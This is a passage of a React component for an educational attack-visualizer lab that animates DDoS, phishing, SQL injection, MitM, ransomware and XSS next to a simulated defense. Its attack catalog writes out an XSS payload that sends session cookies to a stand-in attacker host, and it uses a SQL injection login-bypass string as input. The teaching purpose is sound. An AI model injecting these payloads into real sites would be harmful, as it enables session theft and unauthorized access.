import React, { useState, useEffect, useRef } from 'react';
import {
  Flame,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Zap,
  Radio,
  Lock,
  Unlock,
  Bug,
  Crosshair,
  Server,
  User,
  Bot,
  Play,
  Pause,
  RotateCcw,
  CheckCircle2,
  XCircle,
  AlertTriangle,
  Database,
  Terminal,
  FileCode,
  Mail,
  Key,
  Globe,
  Share2,
  HardDrive,
  Eye,
  ArrowRight,
  Sparkles,
  Layers,
  Code,
  Check,
  ShieldX
} from 'lucide-react';

export const ATTACK_CATALOG = [
  {
    id: 'ddos',
    title: 'DDoS Attack (Distributed Denial of Service)',
    shortName: 'DDoS Flood',
    severity: 'CRITICAL',
    icon: Flame,
    color: 'rose',
    summary: 'Botnet army coordinates a massive volumetric packet surge to exhaust target bandwidth and CPU resources.',
    howItWorks: [
      'Attacker commands a Command & Control (C2) botnet of compromised IoT devices or servers.',
      'Millions of spoofed SYN, UDP, or HTTP requests are simultaneously blasted at target IP/port.',
      'Target network buffer and server worker pools saturate to 100% capacity.',
      'Legitimate user requests timeout or receive HTTP 503/504 errors as the server crashes.'
    ],
    realWorldImpact: 'Service downtime, millions in revenue loss, SLA breaches (e.g., Mirai Botnet, Dyn DNS outage).',
    mitigation: 'AdaptiveShield sliding-window rate limiting, SYN cookies, Anycast BGP scrubbers, and volumetric IP blacklisting.',
    cveExample: 'CWE-400: Uncontrolled Resource Consumption'
  },
  {
    id: 'phishing',
    title: 'Phishing & Social Engineering Attack',
    shortName: 'Phishing Probe',
    severity: 'HIGH',
    icon: Mail,
    color: 'amber',
    summary: 'Deceptive login interface tricks victim into entering credentials, routing them straight to an adversary C2 node.',
    howItWorks: [
      'Attacker sends a spoofed urgency email with a link to a cloned corporate login portal.',
      'Victim submits username, password, and session token into the deceptive form.',
      'Malicious proxy intercepts payload, stores plain credentials, and forwards victim to real service.',
      'Attacker uses harvested credentials to establish persistent unauthorized lateral access.'
    ],
    realWorldImpact: 'Enterprise credential compromise, account takeovers, MFA bypass via Adversary-in-the-Middle (AiTM).',
    mitigation: 'FIDO2 WebAuthn hardware security keys, DMARC/DKIM email enforcement, domain reputation filtering, and zero-trust conditional access.',
    cveExample: 'CWE-200: Exposure of Sensitive Information'
  },
  {
    id: 'sqli',
    title: 'SQL Injection (SQLi) Vulnerability',
    shortName: 'SQL Injection',
    severity: 'CRITICAL',
    icon: Database,
    color: 'purple',
    summary: 'Malicious SQL fragment injected into web form inputs bypasses auth checks and dumps entire relational databases.',
    howItWorks: [
      "User submits input payload containing boolean tautologies like `admin' OR '1'='1' --`.",
      'Vulnerable backend concatenates unsanitized input directly into raw SQL string.',
      'SQL engine evaluates `WHERE username = \'\' OR \'1\'=\'1\'` to TRUE for all rows.',
      'Database authenticates attacker without valid password and permits full data exfiltration.'
    ],
    realWorldImpact: 'Complete database compromise, mass customer data leaks, unauthorized record manipulation.',
    mitigation: 'AdaptiveShield Stage 4 Deep Payload DPI regex filter, Parameterized Queries / Prepared Statements, ORM frameworks, and strict WAF input sanitization.',
    cveExample: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command'
  },
  {
    id: 'mitm',
    title: 'Man-in-the-Middle (MitM) Eavesdropping',
    shortName: 'MitM Proxy',
    severity: 'HIGH',
    icon: Share2,
    color: 'blue',
    summary: 'Attacker positions an interception proxy between client and server, eavesdropping or modifying plaintext traffic.',
    howItWorks: [
      'Attacker executes ARP spoofing, rogue Wi-Fi AP broadcast, or DNS cache poisoning on local LAN.',
      'Victim packet stream is routed through attacker machine before reaching real gateway.',
      'Attacker strips TLS (SSL stripping) or presents forged root certificate.',
      'Sensitive tokens, cookies, and API payloads are read, forged, or altered in flight.'
    ],
    realWorldImpact: 'Session hijacking, financial transaction tampering, corporate espionage on unencrypted LANs.',
    mitigation: 'HSTS (HTTP Strict Transport Security), TLS 1.3 encryption, Certificate Pinning, and IEEE 802.1X port authentication.',
    cveExample: 'CWE-300: Channel Accessible by Non-Endpoint'
  },
  {
    id: 'ransomware',
    title: 'Ransomware Network Propagation',
    shortName: 'Ransomware Worm',
    severity: 'CRITICAL',
    icon: Lock,
    color: 'rose',
    summary: 'Self-replicating malware breaches one endpoint and traverses SMB/RDP shares to encrypt all connected file clusters.',
    howItWorks: [
      'Initial loader executes on single workstation via malicious attachment or unpatched RDP port.',
      'Malware probes internal subnet for lateral ports (Port 445 SMB, Port 3389 RDP).',
      'Uses AES-256 / RSA-4096 asymmetric cryptography to lock all local and network files with `.locked` extension.',
      'Drops extortion note demanding crypto ransom for the decryption private key.'
    ],
    realWorldImpact: 'Total infrastructure freeze, irreversible data destruction, massive extortion payouts (e.g., WannaCry, NotPetya).',
    mitigation: 'AdaptiveShield Stage 2 port filtering (blocking Port 445 & 3389), network micro-segmentation, immutable air-gapped backups, and automated zero-trust host isolation.',
    cveExample: 'CVE-2017-0144 (EternalBlue SMB Remote Code Execution)'
  },
  {
    id: 'xss',
    title: 'Cross-Site Scripting (XSS Execution)',
    shortName: 'XSS Scripting',
    severity: 'HIGH',
    icon: Code,
    color: 'sky',
    summary: 'Hostile JavaScript payload injected into application fields executes arbitrarily inside other victims\' browsers.',
    howItWorks: [
      'Attacker submits stored payload `<script>fetch("https://attacker.c2/steal?cookie="+document.cookie)</script>`.',
      'Server stores payload in database without HTML entity encoding.',
      'When legitimate users view the page, their browser interprets and executes the malicious script.',
      'Victim session cookies and auth tokens are exfiltrated to attacker server.'
    ],
    realWorldImpact: 'Client-side account takeover, malicious DOM manipulation, keylogging, and portal defacement.',
    mitigation: 'AdaptiveShield payload heuristic filters, Context-aware HTML entity encoding, Content Security Policy (CSP), and `HttpOnly` cookie flags.',
    cveExample: 'CWE-79: Improper Neutralization of Input During Web Page Generation'
  }
];

export default function AttackVisualizerLab() {
  const [selectedAttackId, setSelectedAttackId] = useState('ddos');
  const [isPlaying, setIsPlaying] = useState(true);
  const [shieldActive, setShieldActive] = useState(true);
  const [animationTick, setAnimationTick] = useState(0);

  // DDoS State
  const [serverHealth, setServerHealth] = useState(100);
  const [ddosPackets, setDdosPackets] = useState([]);

  // Phishing State
  const [phishPacketProgress, setPhishPacketProgress] = useState(0);

  // SQLi State
  const [sqliInput, setSqliInput] = useState("admin' OR '1'='1' --");
  const [sqliPacketPos, setSqliPacketPos] = useState(0);

  // MitM State
  const [mitmPacketPos, setMitmPacketPos] = useState(0);

  // Ransomware State
  const [ransomwareNodes, setRansomwareNodes] = useState([
    { id: 1, name: 'Server A (Patient 0)', infected: true },
    { id: 2, name: 'Server B (App Node)', infected: false },
    { id: 3, name: 'Server C (Files)', infected: false },
    { id: 4, name: 'DB Cluster (Core)', infected: false }
  ]);

  // XSS State
  const [xssProgress, setXssProgress] = useState(0);

  const activeAttack = ATTACK_CATALOG.find(a => a.id === selectedAttackId) || ATTACK_CATALOG[0];

  // Master Animation Clock
  useEffect(() => {
    if (!isPlaying) return;
    const interval = setInterval(() => {
      setAnimationTick(prev => (prev + 1) % 100);
    }, 50);
    return () => clearInterval(interval);
  }, [isPlaying]);

  // Restart Handler
  const handleRestart = () => {
    setAnimationTick(0);
    setServerHealth(100);
    setPhishPacketProgress(0);
    setSqliPacketPos(0);
    setMitmPacketPos(0);
    setXssProgress(0);
    setRansomwareNodes([
      { id: 1, name: 'Server A (Patient 0)', infected: true },
      { id: 2, name: 'Server B (App Node)', infected: false },
      { id: 3, name: 'Server C (Files)', infected: false },
      { id: 4, name: 'DB Cluster (Core)', infected: false }
    ]);
  };

  // Switch Attack
  const handleSelectAttack = (id) => {
    setSelectedAttackId(id);
    handleRestart();
  };

  // 1. DDOS ANIMATION ENGINE
  useEffect(() => {
    if (selectedAttackId !== 'ddos' || !isPlaying) return;

    if (!shieldActive) {
      setServerHealth(prev => Math.max(8, prev - 2.5));
    } else {
      setServerHealth(prev => Math.min(100, prev + 3));
    }
  }, [animationTick, selectedAttackId, shieldActive, isPlaying]);

  // 2. PHISHING ANIMATION ENGINE
  useEffect(() => {
    if (selectedAttackId !== 'phishing' || !isPlaying) return;
    setPhishPacketProgress((animationTick * 2) % 100);
  }, [animationTick, selectedAttackId, isPlaying]);

  // 3. SQLi ANIMATION ENGINE
  useEffect(() => {
    if (selectedAttackId !== 'sqli' || !isPlaying) return;
    setSqliPacketPos((animationTick * 2) % 100);
  }, [animationTick, selectedAttackId, isPlaying]);

  // 4. MITM ANIMATION ENGINE
  useEffect(() => {
    if (selectedAttackId !== 'mitm' || !isPlaying) return;
    setMitmPacketPos((animationTick * 2) % 100);
  }, [animationTick, selectedAttackId, isPlaying]);

  // 5. RANSOMWARE ANIMATION ENGINE
  useEffect(() => {
    if (selectedAttackId !== 'ransomware' || !isPlaying) return;
    if (!shieldActive) {
      const step = Math.floor(animationTick / 25);
      setRansomwareNodes(prev =>
        prev.map((n, idx) => ({ ...n, infected: idx <= step }))
      );
    } else {
      setRansomwareNodes([
        { id: 1, name: 'Server A (Quarantined)', infected: true, isolated: true },
        { id: 2, name: 'Server B (Protected)', infected: false, isolated: false },
        { id: 3, name: 'Server C (Protected)', infected: false, isolated: false },
        { id: 4, name: 'DB Cluster (Protected)', infected: false, isolated: false }
      ]);
    }
  }, [animationTick, selectedAttackId, shieldActive, isPlaying]);

  // 6. XSS ANIMATION ENGINE
  useEffect(() => {
    if (selectedAttackId !== 'xss' || !isPlaying) return;
    setXssProgress((animationTick * 2) % 100);
  }, [animationTick, selectedAttackId, isPlaying]);

  return (
    <div className="space-y-8 animate-fadeIn text-gray-900">
      {/* Section Header */}
      <div className="text-center max-w-3xl mx-auto space-y-3">
        <div className="inline-flex items-center gap-2 px-3.5 py-1 rounded-full bg-blue-600/10 border border-blue-500/30 text-blue-400 text-xs font-mono font-semibold tracking-wider">
          <Crosshair className="w-3.5 h-3.5 text-blue-400" />
          INTERACTIVE THREAT LAB &amp; PACKET SIMULATOR
        </div>
        <h2 className="text-2xl sm:text-4xl font-extrabold tracking-tight text-white">
          Cyber Attack Techniques <span className="bg-gradient-to-r from-blue-400 via-sky-300 to-indigo-400 bg-clip-text text-transparent">&amp; Defense Engine</span>
        </h2>
        <p className="text-sm sm:text-base text-slate-300">
          Select an attack category below to watch dynamic packet movement, visual exploit execution, and real-time AdaptiveShield active blocking.
        </p>
      </div>

      {/* Attack Selection Carousel / Tabs */}
      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-3">
        {ATTACK_CATALOG.map((atk) => {
          const Icon = atk.icon;
          const isSelected = selectedAttackId === atk.id;
          return (
            <button
              key={atk.id}
              onClick={() => handleSelectAttack(atk.id)}
              className={`p-4 rounded-2xl text-left flex flex-col justify-between space-y-3 transition-all duration-200 cursor-pointer ${
                isSelected
                  ? 'bg-white text-gray-900 shadow-xl shadow-blue-500/15 ring-2 ring-blue-500 scale-[1.02]'
                  : 'bg-slate-900/90 hover:bg-slate-800 text-slate-300 border border-slate-800'
              }`}
            >
              <div className="flex items-center justify-between">
                <div className={`w-9 h-9 rounded-xl flex items-center justify-center ${
                  isSelected ? 'bg-blue-600 text-white shadow-md' : 'bg-slate-800 text-slate-400'
                }`}>
                  <Icon className="w-5 h-5" />
                </div>
                <span className={`text-[9px] font-mono font-bold px-1.5 py-0.5 rounded ${
                  atk.severity === 'CRITICAL'
                    ? 'bg-rose-500/10 text-rose-500 border border-rose-500/30'
                    : 'bg-amber-500/10 text-amber-500 border border-amber-500/30'
                }`}>
                  {atk.severity}
                </span>
              </div>

              <div>
                <h3 className={`text-xs font-bold ${isSelected ? 'text-gray-900' : 'text-slate-200'}`}>
                  {atk.shortName}
                </h3>
                <p className={`text-[10px] mt-0.5 line-clamp-1 ${isSelected ? 'text-gray-500' : 'text-slate-400'}`}>
                  {atk.cveExample.split(':')[0]}
                </p>
              </div>
            </button>
          );
        })}
      </div>

      {/* Interactive Canvas Visualizer Box (High-Contrast White Card) */}
      <div className="rounded-3xl bg-white border border-slate-200 shadow-2xl p-6 lg:p-8 space-y-6">
        {/* Controls Toolbar */}
        <div className="flex flex-wrap items-center justify-between gap-4 border-b border-gray-100 pb-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-2xl bg-blue-50 border border-blue-200 flex items-center justify-center text-blue-600 shrink-0">
              <activeAttack.icon className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h3 className="text-base sm:text-lg font-bold text-gray-900">
                  {activeAttack.title}
                </h3>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-blue-100 text-blue-800 font-bold">
                  LIVE PACKET SIMULATOR
                </span>
              </div>
              <p className="text-xs text-gray-500">Compare unfiltered attack impact vs. active AdaptiveShield defense.</p>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-2.5">
            {/* Play/Pause */}
            <button
              onClick={() => setIsPlaying(!isPlaying)}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 text-xs font-semibold text-gray-700 transition-all duration-200"
            >
              {isPlaying ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5 text-blue-600" />}
              {isPlaying ? 'Pause' : 'Play'}
            </button>

            {/* Restart */}
            <button
              onClick={handleRestart}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 text-xs font-semibold text-gray-700 transition-all duration-200"
              title="Restart Simulation"
            >
              <RotateCcw className="w-3.5 h-3.5" />
              Reset
            </button>

            {/* AdaptiveShield Defense Mode Toggle */}
            <button
              onClick={() => setShieldActive(!shieldActive)}
              className={`flex items-center gap-2 px-4 py-1.5 rounded-xl text-xs font-bold transition-all duration-200 shadow-md ${
                shieldActive
                  ? 'bg-blue-600 hover:bg-blue-700 text-white shadow-blue-600/25 ring-2 ring-blue-400'
                  : 'bg-rose-50 text-rose-700 border border-rose-300 hover:bg-rose-100'
              }`}
            >
              {shieldActive ? <ShieldCheck className="w-4 h-4 text-white" /> : <ShieldX className="w-4 h-4 text-rose-600" />}
              <span>{shieldActive ? 'AdaptiveShield Defense: ON' : 'AdaptiveShield Defense: OFF'}</span>
            </button>
          </div>
        </div>

        {/* Dynamic Dark Canvas Stage */}
        <div className="rounded-2xl bg-gradient-to-br from-slate-900 via-[#070c18] to-slate-950 border border-slate-800 p-6 sm:p-8 min-h-[420px] flex flex-col justify-between relative overflow-hidden text-slate-100 shadow-inner">

          {/* =========================================================================
              1. DDOS ATTACK VISUALIZER (SVG PACKET FLOW & DEFENSE BARRIER)
              ========================================================================= */}
          {selectedAttackId === 'ddos' && (
            <div className="space-y-6">
              <div className="flex flex-wrap items-center justify-between gap-4 text-xs font-mono">
                <div className="flex items-center gap-2">
                  <span className={`w-2.5 h-2.5 rounded-full ${shieldActive ? 'bg-blue-400' : 'bg-rose-500 animate-ping'}`}></span>
                  <span className={shieldActive ? 'text-blue-300 font-bold' : 'text-rose-400 font-bold'}>
                    {shieldActive ? 'SHIELD FILTERING & VOLUMETRIC SCRUBBING' : 'UNFILTERED VOLUMETRIC FLOOD'}
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  <span>Target Server Health:</span>
                  <strong className={serverHealth < 40 ? 'text-rose-400 font-bold animate-pulse' : 'text-emerald-400 font-bold'}>
                    {Math.round(serverHealth)}% {serverHealth < 40 ? '(CRASHING / 503)' : '(OPERATIONAL)'}
                  </strong>
                </div>
              </div>

              {/* Interactive SVG Animation Stage */}
              <div className="relative h-64 w-full bg-slate-950/80 rounded-2xl border border-slate-800 overflow-hidden flex items-center justify-between px-6 sm:px-12">
                {/* Background Connecting Lines */}
                <svg className="absolute inset-0 w-full h-full pointer-events-none">
                  {/* Botnet to Shield/Server lines */}
                  <line x1="12%" y1="20%" x2="50%" y2="50%" stroke="#e11d48" strokeWidth="2" strokeDasharray="4 4" opacity="0.4" />
                  <line x1="12%" y1="50%" x2="50%" y2="50%" stroke="#e11d48" strokeWidth="2" strokeDasharray="4 4" opacity="0.4" />
                  <line x1="12%" y1="80%" x2="50%" y2="50%" stroke="#e11d48" strokeWidth="2" strokeDasharray="4 4" opacity="0.4" />

                  {/* Legitimate client line */}
                  <line x1="12%" y1="92%" x2="50%" y2="50%" stroke="#10b981" strokeWidth="2" strokeDasharray="4 4" opacity="0.5" />

                  {/* Shield to Server line */}
                  <line x1="50%" y1="50%" x2="88%" y2="50%" stroke={shieldActive ? '#10b981' : '#e11d48'} strokeWidth="3" opacity="0.8" />
                </svg>

                {/* Animated Flowing Packets */}
                {/* Red Attack Packets */}
                {isPlaying && (
                  <>
                    <div
                      className="absolute w-3.5 h-3.5 rounded-full bg-rose-500 shadow-lg shadow-rose-500/50 transition-all duration-75"
                      style={{
                        left: shieldActive
                          ? `${12 + (animationTick % 40) * 0.95}%` // Deflects/drops at shield (50%)
                          : `${12 + (animationTick % 80) * 0.95}%`, // Reaches server (88%)
                        top: '40%',
                        opacity: shieldActive && (animationTick % 40) > 35 ? 0 : 1
                      }}
                    ></div>
                    <div
                      className="absolute w-3.5 h-3.5 rounded-full bg-rose-500 shadow-lg shadow-rose-500/50 transition-all duration-75"
                      style={{
                        left: shieldActive
                          ? `${12 + ((animationTick + 20) % 40) * 0.95}%`
                          : `${12 + ((animationTick + 20) % 80) * 0.95}%`,
                        top: '55%',
                        opacity: shieldActive && ((animationTick + 20) % 40) > 35 ? 0 : 1
                      }}
                    ></div>
                    <div
                      className="absolute w-3.5 h-3.5 rounded-full bg-rose-500 shadow-lg shadow-rose-500/50 transition-all duration-75"
                      style={{
                        left: shieldActive
                          ? `${12 + ((animationTick + 40) % 40) * 0.95}%`
                          : `${12 + ((animationTick + 40) % 80) * 0.95}%`,
                        top: '30%',
                        opacity: shieldActive && ((animationTick + 40) % 40) > 35 ? 0 : 1
                      }}
                    ></div>
                    {/* Clean Green User Packet */}
                    <div
                      className="absolute w-3.5 h-3.5 rounded-full bg-emerald-400 shadow-lg shadow-emerald-400/50 transition-all duration-75"
                      style={{
                        left: `${12 + (animationTick % 76) * 1}%`,
                        top: '50%'
                      }}
                    ></div>
                  </>
                )}

                {/* LEFT NODE: BOTNET SWARM */}
                <div className="relative z-10 p-3 rounded-2xl bg-slate-900 border border-rose-500/40 text-center space-y-1 shadow-lg">
                  <div className="w-10 h-10 rounded-xl bg-rose-950 text-rose-400 flex items-center justify-center mx-auto animate-pulse">
                    <Bot className="w-5 h-5" />
                  </div>
                  <div className="text-[11px] font-mono font-bold text-rose-400">Botnet Ingress</div>
                  <div className="text-[9px] text-slate-400 font-mono">10,000+ Bots</div>
                </div>

                {/* MIDDLE NODE: ADAPTIVESHIELD RATE LIMITER */}
                <div className="relative z-10 flex flex-col items-center">
                  <div className={`p-4 rounded-3xl border-2 transition-all duration-300 text-center ${
                    shieldActive
                      ? 'bg-blue-950/90 border-blue-400 text-blue-300 ring-8 ring-blue-500/20 scale-105 shadow-xl shadow-blue-500/30'
                      : 'bg-slate-900/60 border-slate-700 text-slate-600 opacity-40'
                  }`}>
                    <Shield className="w-8 h-8 mx-auto animate-gentle-pulse" />
                    <span className="text-[11px] font-mono font-bold mt-1 block">
                      {shieldActive ? 'WAF & Rate Limiter' : 'Shield Inactive'}
                    </span>
                  </div>
                  <span className={`text-[10px] font-mono mt-2 px-2 py-0.5 rounded font-bold ${
                    shieldActive ? 'bg-blue-950 text-blue-300 border border-blue-500/40' : 'bg-rose-950 text-rose-400'
                  }`}>
                    {shieldActive ? 'DROPPING 450K REQ/S' : 'PASSING RAW'}
                  </span>
                </div>

                {/* RIGHT NODE: TARGET SERVER */}
                <div className={`relative z-10 p-3.5 rounded-2xl border transition-all duration-300 text-center space-y-1 ${
                  serverHealth < 40
                    ? 'bg-rose-950/80 border-rose-500 text-rose-300 ring-4 ring-rose-500/40 animate-pulse'
                    : 'bg-slate-900 border-emerald-500/40 text-emerald-300'
                }`}>
                  <div className={`w-10 h-10 rounded-xl flex items-center justify-center mx-auto ${
                    serverHealth < 40 ? 'bg-rose-900 text-white' : 'bg-emerald-950 text-emerald-400'
                  }`}>
                    <Server className="w-5 h-5" />
                  </div>
                  <div className="text-[11px] font-mono font-bold">
                    {serverHealth < 40 ? 'Server Crashing' : 'Web Server'}
                  </div>
                  <div className="text-[9px] font-mono">
                    {serverHealth < 40 ? 'HTTP 503' : '200 OK'}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* =========================================================================
              2. PHISHING ATTACK VISUALIZER
              ========================================================================= */}
          {selectedAttackId === 'phishing' && (
            <div className="space-y-6">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-amber-400 font-bold">CREDENTIAL HARVESTING &amp; DOMAIN REPUTATION FILTER</span>
                <span className={shieldActive ? 'text-blue-300 font-bold' : 'text-rose-400 font-bold'}>
                  {shieldActive ? '✓ FIDO2 WebAuthn Enforced' : '⚠️ Plaintext Credentials Stolen'}
                </span>
              </div>

              {/* Phishing Stage */}
              <div className="relative h-64 w-full bg-slate-950/80 rounded-2xl border border-slate-800 overflow-hidden flex items-center justify-between px-6 sm:px-12">
                <svg className="absolute inset-0 w-full h-full pointer-events-none">
                  {/* Attacker to User line */}
                  <line x1="15%" y1="50%" x2="50%" y2="50%" stroke="#f59e0b" strokeWidth="2" strokeDasharray="4 4" opacity="0.6" />
                  {/* User to C2 Server line */}
                  <line x1="50%" y1="50%" x2="85%" y2="50%" stroke={shieldActive ? '#3b82f6' : '#e11d48'} strokeWidth="2" strokeDasharray="4 4" opacity="0.6" />
                </svg>

                {/* Flowing credential packet */}
                {isPlaying && (
                  <div
                    className="absolute w-4 h-4 rounded-full bg-rose-500 shadow-lg shadow-rose-500/50 flex items-center justify-center text-[9px] text-white font-bold"
                    style={{
                      left: shieldActive
                        ? `${50 + (phishPacketProgress % 20) * 0.8}%` // Blocked at User Boundary
                        : `${50 + (phishPacketProgress % 40) * 0.87}%`, // Reaches C2 server
                      top: '50%',
                      opacity: shieldActive && (phishPacketProgress % 20) > 15 ? 0 : 1
                    }}
                  >
                    🔑
                  </div>
                )}

                {/* LEFT: ATTACKER LURE */}
                <div className="relative z-10 p-3 rounded-2xl bg-slate-900 border border-amber-500/40 text-center space-y-1">
                  <div className="w-10 h-10 rounded-xl bg-amber-950 text-amber-400 flex items-center justify-center mx-auto">
                    <Mail className="w-5 h-5" />
                  </div>
                  <div className="text-[11px] font-mono font-bold text-amber-300">Spoofed Lure</div>
                  <div className="text-[9px] text-slate-400 font-mono">your-c0mpany.co</div>
                </div>

                {/* MIDDLE: USER LOGIN FORM (WITH SHIELD BADGE IF ACTIVE) */}
                <div className={`relative z-10 p-4 rounded-3xl border-2 transition-all duration-300 text-center ${
                  shieldActive
                    ? 'bg-blue-950/80 border-blue-400 ring-8 ring-blue-500/20 text-blue-300 shadow-xl'
                    : 'bg-slate-900 border-rose-500/50 text-rose-300'
                }`}>
                  <User className="w-8 h-8 mx-auto mb-1" />
                  <div className="text-xs font-mono font-bold">Victim Client</div>
                  <div className="text-[10px] font-mono mt-1 px-2 py-0.5 rounded bg-black/40">
                    {shieldActive ? '🛡️ Auth Shield Active' : 'user: victim@corp'}
                  </div>
                </div>

                {/* RIGHT: ATTACKER C2 REPOSITORY */}
                <div className={`relative z-10 p-3 rounded-2xl border transition-all text-center space-y-1 ${
                  shieldActive ? 'bg-slate-900/60 border-slate-700 opacity-40 text-slate-500' : 'bg-rose-950 border-rose-500 text-rose-300 animate-pulse'
                }`}>
                  <div className="w-10 h-10 rounded-xl bg-black/40 text-rose-400 flex items-center justify-center mx-auto">
                    <Key className="w-5 h-5" />
                  </div>
                  <div className="text-[11px] font-mono font-bold">Adversary C2</div>
                  <div className="text-[9px] font-mono">
                    {shieldActive ? '0 Creds Received' : 'Password Stolen!'}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* =========================================================================
              3. SQL INJECTION (SQLi) VISUALIZER
              ========================================================================= */}
          {selectedAttackId === 'sqli' && (
            <div className="space-y-6">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-purple-400 font-bold">STAGE 4 DEEP PAYLOAD DPI &amp; PARAMETERIZATION</span>
                <span className={shieldActive ? 'text-blue-300 font-bold' : 'text-rose-400 font-bold'}>
                  {shieldActive ? '✓ Malicious Tautology Syntax Stripped' : '⚠️ User Table Auth Bypassed'}
                </span>
              </div>

              {/* SQL Stage */}
              <div className="relative h-64 w-full bg-slate-950/80 rounded-2xl border border-slate-800 overflow-hidden flex items-center justify-between px-6 sm:px-12">
                <svg className="absolute inset-0 w-full h-full pointer-events-none">
                  <line x1="15%" y1="50%" x2="50%" y2="50%" stroke="#a855f7" strokeWidth="2" strokeDasharray="4 4" opacity="0.6" />
                  <line x1="50%" y1="50%" x2="85%" y2="50%" stroke={shieldActive ? '#3b82f6' : '#e11d48'} strokeWidth="2" strokeDasharray="4 4" opacity="0.6" />
                </svg>

                {/* Moving SQL payload packet */}
                {isPlaying && (
                  <div
                    className="absolute px-2 py-0.5 rounded bg-purple-600 text-white font-mono text-[9px] font-bold shadow-lg shadow-purple-600/50"
                    style={{
                      left: shieldActive
                        ? `${15 + (sqliPacketPos % 38) * 0.95}%` // Intercepted at Shield (50%)
                        : `${15 + (sqliPacketPos % 72) * 0.95}%`, // Reaches DB
                      top: '47%',
                      opacity: shieldActive && (sqliPacketPos % 38) > 34 ? 0 : 1
                    }}
                  >
                    ' OR '1'='1
                  </div>
                )}

                {/* LEFT: FORM INPUT */}
                <div className="relative z-10 p-3 rounded-2xl bg-slate-900 border border-purple-500/40 text-center space-y-1">
                  <div className="w-10 h-10 rounded-xl bg-purple-950 text-purple-400 flex items-center justify-center mx-auto">
                    <Code className="w-5 h-5" />
                  </div>
                  <div className="text-[11px] font-mono font-bold text-purple-300">Auth Login Field</div>
                  <div className="text-[9px] text-slate-400 font-mono">POST /api/auth</div>
                </div>

                {/* MIDDLE: STAGE 4 PAYLOAD INSPECTOR */}
                <div className={`relative z-10 p-4 rounded-3xl border-2 transition-all duration-300 text-center ${
                  shieldActive
                    ? 'bg-blue-950/80 border-blue-400 ring-8 ring-blue-500/20 text-blue-300 shadow-xl'
                    : 'bg-slate-900 border-slate-700 opacity-40 text-slate-500'
                }`}>
                  <Shield className="w-8 h-8 mx-auto" />
                  <div className="text-xs font-mono font-bold mt-1">Stage 4 DPI Filter</div>
                  <div className="text-[9px] font-mono mt-1 text-blue-300">
                    {shieldActive ? 'Regex [SIG-SQLI] Match' : 'Bypass'}
                  </div>
                </div>

                {/* RIGHT: DATABASE CORE */}
                <div className={`relative z-10 p-3 rounded-2xl border transition-all text-center space-y-1 ${
                  shieldActive ? 'bg-slate-900 border-emerald-500/40 text-emerald-300' : 'bg-rose-950 border-rose-500 text-rose-300 animate-pulse'
                }`}>
                  <div className={`w-10 h-10 rounded-xl flex items-center justify-center mx-auto ${
                    shieldActive ? 'bg-emerald-950 text-emerald-400' : 'bg-rose-900 text-white'
                  }`}>
                    <Database className="w-5 h-5" />
                  </div>
                  <div className="text-[11px] font-mono font-bold">SQL Database</div>
                  <div className="text-[9px] font-mono">
                    {shieldActive ? '✓ Query Safe' : 'Table Dumped!'}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* =========================================================================
              4. MAN-IN-THE-MIDDLE (MITM) VISUALIZER
              ========================================================================= */}
          {selectedAttackId === 'mitm' && (
            <div className="space-y-6">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-blue-400 font-bold">TLS 1.3 CERTIFICATE PINNING &amp; ENCRYPTED TUNNEL</span>
                <span className={shieldActive ? 'text-blue-300 font-bold' : 'text-rose-400 font-bold'}>
                  {shieldActive ? '✓ Encrypted Tunnel Active' : '⚠️ Payload Tampered in Flight'}
                </span>
              </div>

              {/* MitM Stage */}
              <div className="relative h-64 w-full bg-slate-950/80 rounded-2xl border border-slate-800 overflow-hidden flex items-center justify-between px-6 sm:px-12">
                <svg className="absolute inset-0 w-full h-full pointer-events-none">
                  <line x1="15%" y1="50%" x2="50%" y2="50%" stroke={shieldActive ? '#3b82f6' : '#e11d48'} strokeWidth="3" opacity="0.7" />
                  <line x1="50%" y1="50%" x2="85%" y2="50%" stroke={shieldActive ? '#3b82f6' : '#e11d48'} strokeWidth="3" opacity="0.7" />
                </svg>

                {/* Packet moving between Client and Bank */}
                {isPlaying && (
                  <div
                    className={`absolute px-2 py-0.5 rounded text-white font-mono text-[9px] font-bold shadow-lg ${
                      shieldActive ? 'bg-blue-600 shadow-blue-500/50' : 'bg-rose-600 shadow-rose-500/50'
                    }`}
                    style={{
                      left: `${15 + (mitmPacketPos % 70) * 1}%`,
                      top: '47%'
                    }}
                  >
                    {shieldActive ? '🔒 TLS Encrypted: $500' : (mitmPacketPos > 50 ? '⚠️ Altered: $5000' : 'Plaintext: $500')}
                  </div>
                )}

                {/* CLIENT A */}
                <div className="relative z-10 p-3 rounded-2xl bg-slate-900 border border-blue-500/40 text-center space-y-1">
                  <div className="w-10 h-10 rounded-xl bg-blue-950 text-blue-400 flex items-center justify-center mx-auto">
                    <User className="w-5 h-5" />
                  </div>
                  <div className="text-[11px] font-mono font-bold text-white">Client Node A</div>
                  <div className="text-[9px] text-slate-400 font-mono">Transfer $500</div>
                </div>

                {/* MIDDLE: ROGUE PROXY / MITM EAVESDROPPER */}
                <div className={`relative z-10 p-3.5 rounded-3xl border-2 transition-all duration-300 text-center ${
                  shieldActive
                    ? 'bg-slate-900/60 border-slate-700 opacity-40 text-slate-500'
                    : 'bg-rose-950/80 border-rose-500 text-rose-300 ring-8 ring-rose-500/20 animate-pulse'
                }`}>
                  <Share2 className="w-8 h-8 mx-auto" />
                  <div className="text-xs font-mono font-bold mt-1">Rogue MitM Proxy</div>
                  <div className="text-[9px] font-mono mt-1">
                    {shieldActive ? 'Blocked by TLS Pinning' : 'Intercepting & Altering'}
                  </div>
                </div>

